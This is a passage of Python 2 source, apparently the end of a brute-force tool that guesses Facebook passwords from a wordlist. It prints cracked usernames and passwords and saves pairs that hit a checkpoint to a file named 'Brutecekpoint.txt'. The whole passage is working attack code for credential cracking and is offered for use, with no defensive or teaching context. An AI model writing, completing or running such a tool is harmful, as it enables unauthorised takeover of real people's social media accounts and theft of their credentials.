                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;36;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print "\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"
            super()


if __name__ == '__main__':
    login()
